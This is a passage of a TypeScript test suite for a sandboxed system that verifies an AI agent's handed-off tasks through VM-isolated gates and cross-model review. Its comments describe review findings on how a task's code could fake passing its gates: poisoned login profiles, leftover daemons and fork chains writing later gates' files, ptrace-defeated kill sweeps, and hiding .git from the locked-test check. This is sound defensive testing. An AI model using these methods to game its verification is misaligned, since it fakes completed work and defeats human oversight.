      return { done, herVm, placement, gates: done.trail.filter((t) => t.text.startsWith("Gate ")).map((t) => t.text.split("\n").slice(0, 2).join(" / ").slice(0, 200)) };
    }

    test("a task handed to beta's agent runs in a VM of its own beside hers, through its gates, review and bring-back, and comes back Proven", async () => {
      const { done, herVm } = await handOff("TASK_REAL");
      // Done, and Proven by beta's own signature: its gate failed before the work and passes after, another model reviewed.
      expect(done).toMatchObject({ phase: "ended", status: "done", agent: { id: "ada", name: "Ada" }, error: null });
      expect(done.proof).toEqual({ state: "checked", verified: true, ended: "done", proof: { before: [1], after: [0], review: "pass", sameModel: false } });
      // Its changes came back to her worktree, and were read and kept there.
      const there = (await pair.callB<TeamSnapshot>("team")).tasks.find((t) => t.id === done.task);
      expect(there).toMatchObject({ status: "done", verified: true, assignee: "ada" });
      expect(docker("exec", herVm, "cat", `/work/tasks/${done.task}/result-real.txt`).stdout).toBe("real\n");
      expect(done.output).toContain("Changes: 1 file");
    });

    test("its gates run in a VM of each round's own, never in the task's, and its work in the task's, never in a round's", async () => {
      const { done, placement } = await handOff("TASK_REAL");
      expect(done.proof).toMatchObject({ state: "checked", verified: true });
      placement();
    });

    /*
     * The eighth fabric review's R8-3: each node command in the task's VM ran as `bash -lc`, under the login profile the
     * task writes there, so a task chose its gates' verdict. Now none reads a profile, the helper is the VM's own python3
     * by its path, and its gates run as their own user on a copy of the tree: what each says is what its gate did.
     */
    test("R8-3: a task whose login profile says its gates pass comes back as its gates find it: not verified", async () => {
      const { done, herVm, gates } = await handOff("TASK_PROFILE");
      console.log(`  its gates, as its trail says them:\n    ${gates.join("\n    ")}`);
      // (Checked against beta's signature, as any: what beta says is that its gate failed, so not verified.)
      expect(done.proof).toMatchObject({ state: "checked", verified: false, proof: { before: [1], after: [1] } });
      expect(gates.every((gate) => !gate.includes("as this task tells it"))).toBe(true);
      expect(docker("exec", herVm, "test", "-e", `/work/tasks/${done.task}/result-real.txt`).status).not.toBe(0);
    });

    test("R8-3: a process the freeze's end misses can't make a gate pass: the gates run as their own user, on a copy no process of the task's can reach", async () => {
      const { done, herVm, gates } = await handOff("TASK_SURVIVOR");
      console.log(`  its gates, as its trail says them:\n    ${gates.join("\n    ")}`);
      // (Checked against beta's signature, as any: what beta says is that its gate failed, so not verified.)
      expect(done.proof).toMatchObject({ state: "checked", verified: false, proof: { before: [1], after: [1] } });
      expect(docker("exec", herVm, "test", "-e", `/work/tasks/${done.task}/result-real.txt`).status).not.toBe(0);
    });

    /*
     * The ninth review's R9-2: every gate ran as the one gates' user, and nothing ended that user's processes between
     * gates. So a first gate that runs the task's code (its own test) left a process behind that wrote the second gate's
     * file into each later copy, and the task came back Proven. Now each copy, and each gate's end, ends every process
     * of that user but its own, and a gate whose processes can't all be ended doesn't pass.
     */
    test("R9-2: a process a gate's run of the task's code leaves behind can't pass a later gate: each copy and each gate's end end every process of the gates' user", async () => {
      const { done, herVm, gates, placement } = await handOff("TASK_DAEMON", ["bun test zz", "test -f result-real.txt"]);
      console.log(`  its gates, as its trail says them:\n    ${gates.join("\n    ")}`);
      // (Checked against beta's signature: what beta says is that its second gate failed each time, so not verified.)
      expect(done.proof).toMatchObject({ state: "checked", verified: false });
      expect((done.proof as { proof: { after: number[] } }).proof.after[1]).not.toBe(0);
      expect(docker("exec", herVm, "test", "-e", `/work/tasks/${done.task}/result-real.txt`).status).not.toBe(0);
      placement();
    });

    /*
     * The eleventh review's R11-1: the sweep between gates passed by a process whose leader thread had exited while
     * another ran on ("Z" in /proc), and a chain of processes each forking its next outran it; either way the task's test,
     * run by a first gate, left what wrote a later gate's file into its copy, and the task came back Proven. And with one
     * ordinary gate: round 1's run of the task's code left what wrote a passing app.ts into round 2's copy. Now each round
     * runs in a VM of its own, and every process of the gates' user there is ended before each copy by kill(-1).
     */
    test("R11-1: a group whose leader thread has exited, left by a gate's run of the task's code, passes no later gate", async () => {
      const { done, herVm, gates, placement } = await handOff("TASK_ZOMBIE", ["bun test zz", "test -f result-real.txt"]);
      console.log(`  its gates, as its trail says them:\n    ${gates.join("\n    ")}`);
      console.log(`  ${runtime}, R11-1: proof ${JSON.stringify(done.proof)}`);
      expect(done.proof).toMatchObject({ state: "checked", verified: false });
      expect((done.proof as { proof: { after: number[] } }).proof.after[1]).not.toBe(0);
      expect(docker("exec", herVm, "test", "-e", `/work/tasks/${done.task}/result-real.txt`).status).not.toBe(0);
      placement();
    });

    test("R11-1 with one gate: what round 1's run of the task's code left passes no gate of round 2, and her locked test is as it was", async () => {
      const { done, herVm, gates, placement } = await handOff("TASK_ZOMBIE_APP", ["bun test check.test.ts"]);
      console.log(`  its gates, as its trail says them:\n    ${gates.join("\n    ")}`);
      console.log(`  ${runtime}, R11-1 (one gate): proof ${JSON.stringify(done.proof)}`);
      expect(done.proof).toMatchObject({ state: "checked", verified: false });
      const cat = (file: string) => docker("exec", herVm, "cat", `/work/tasks/${done.task}/${file}`).stdout;
      expect(cat("app.ts")).toContain("value = () => 1");
      expect(cat("check.test.ts")).toContain("toBe(2)");
      placement();
    });

    test("R11-1's second road: a chain of processes each forking its next passes no later gate", async () => {
      const { done, herVm, gates, placement } = await handOff("TASK_CHAIN", ["bun test zz", "test -f result-real.txt"]);
      console.log(`  its gates, as its trail says them:\n    ${gates.join("\n    ")}`);
      console.log(`  ${runtime}, R11-1 (chain): proof ${JSON.stringify(done.proof)}`);
      expect(done.proof).toMatchObject({ state: "checked", verified: false });
      expect((done.proof as { proof: { after: number[] } }).proof.after[1]).not.toBe(0);
      expect(docker("exec", herVm, "test", "-e", `/work/tasks/${done.task}/result-real.txt`).status).not.toBe(0);
      placement();
    });

    /*
     * The twelfth review's R12-1: a process that a gate's run of the task's code left traced its gate's helper and the
     * round's sweep, which ran as its own user, and turned their kill into their own exit: in Kata, whose guest kernel has
     * no Yama, the sweep exited 0 with the process still running, and it wrote the second gate's file into its copy, and
     * the task came back Proven. Now each gate of a round runs as a user of its own that no other gate of the round has,
     * on a copy that user alone can reach: what one gate's user left can trace, signal or write nothing of the next's.
     */
    test.skipIf(process.arch !== "x64")("R12-1: a process a gate's run of the task's code leaves, tracing its gate's helper and the sweeps, passes no later gate", async () => {
      const { done, herVm, gates, placement } = await handOff("TASK_PTRACE", ["bun test", "test -f result-real.txt"]);
      console.log(`  its gates, as its trail says them:\n    ${gates.join("\n    ")}`);
      console.log(`  ${runtime}, R12-1: proof ${JSON.stringify(done.proof)}`);
      expect(done.proof).toMatchObject({ state: "checked", verified: false });
      expect((done.proof as { proof: { after: number[] } }).proof.after[1]).not.toBe(0);
      expect(docker("exec", herVm, "test", "-e", `/work/tasks/${done.task}/result-real.txt`).status).not.toBe(0);
      placement();
    });

    /*
     * The eleventh review's R11-2: the node's check that its locked test is as it was ran on a gates' copy, and one it
     * couldn't make was taken as no change: a process the freeze missed closed the clone's .git to the gates' user until
     * the check's copy had failed, the gate then ran the rewritten test, and the task came back Proven. Now the round's
     * tree is taken by the task's VM's own user, hashed as the round's VM keeps it, and a check that can't be made sends the
     * work back. The control first: the rewrite alone is found.
     */
    test("R11-2, its control: a task that rewrites its locked test is sent back by the check, and isn't verified", async () => {
      const { done, placement } = await handOff("TASK_LOCKED_PLAIN", ["bun test locked.test.ts"]);
      console.log(`  ${runtime}, R11-2 control: proof ${JSON.stringify(done.proof)}; locked: ${done.trail.filter((t) => /changed locked\.test\.ts|Tests changed/.test(t.text)).length}`);
      expect(done.proof).toMatchObject({ state: "checked", verified: false });
      placement();
    });

    /*
     * Its gates' VM has no network: a gate that installs its packages takes them from the node's install cache, filled
     * by the node's filler from the registry as each round begins (sandbox install-cache.ts), mounted read-only. One whose
     * lockfile names another source is filled with nothing, and its gate fails offline, saying why.
     */
    test("a gate that installs a dependency of the registry's takes it from the node's install cache, offline, and passes", async () => {
      const { manifest, lock } = lockfile({ "is-odd": "3.0.1" });
      LATE.TASK_DEPS = written({ "package.json": manifest, "bun.lock": lock, "odd.test.ts": ODD_TEST });
      const { done, placement } = await handOff("TASK_DEPS", ["bun install --frozen-lockfile && bun test odd.test.ts"]);
      console.log(`  ${runtime}, the install cache: proof ${JSON.stringify(done.proof)}`);
      const calls = readFileSync(log, "utf8").split("\n").filter((line) => / run .*sbx-fill-/.test(line));
      console.log(`  its fills: ${calls.length}`);
      expect(done.proof).toMatchObject({ state: "checked", verified: true, proof: { before: [1], after: [0] } });
      expect(calls.length).toBeGreaterThan(0);
      placement();
    });

    test("a gate whose lockfile names a package from elsewhere than the registry fails offline, and says why", async () => {
      const { manifest, lock } = lockfile({ "is-odd": "3.0.1" });
      const git = JSON.stringify({ name: "project", private: true, dependencies: { "is-odd": "github:someone/is-odd" } });
      LATE.TASK_DEPS_GIT = written({ "package.json": git, "bun.lock": lock.replace(manifest.slice(1, -1), git.slice(1, -1)), "odd.test.ts": ODD_TEST });
      const { done } = await handOff("TASK_DEPS_GIT", ["bun install --frozen-lockfile && bun test odd.test.ts"]);
      const said = done.trail.filter((t) => t.text.startsWith("Gate ")).map((t) => t.text).join("\n");
      console.log(`  ${runtime}, the install cache refused: proof ${JSON.stringify(done.proof)}; said: ${/\(Its round's VM has no network[^)]*\)/.exec(said)?.[0] ?? "nothing"}`);
      expect(done.proof).toMatchObject({ state: "checked", verified: false });
      expect(said).toContain("Its round's VM has no network, and the install cache it takes its packages from couldn't be filled");
    });

    test("R11-2: the same task with a process the freeze misses, closing its .git around the check's copy, is sent back all the same", async () => {
      const { done, herVm, gates, placement } = await handOff("TASK_LOCKED", ["bun test locked.test.ts"]);
      console.log(`  its gates, as its trail says them:\n    ${gates.join("\n    ")}`);
      console.log(`  ${runtime}, R11-2: proof ${JSON.stringify(done.proof)}; locked: ${done.trail.filter((t) => /changed locked\.test\.ts|Tests changed/.test(t.text)).length}`);
      expect(done.proof).toMatchObject({ state: "checked", verified: false });
      expect(docker("exec", herVm, "cat", `/work/tasks/${done.task}/app.txt`).stdout).toBe("one\n");
      placement();
    });
  });
}
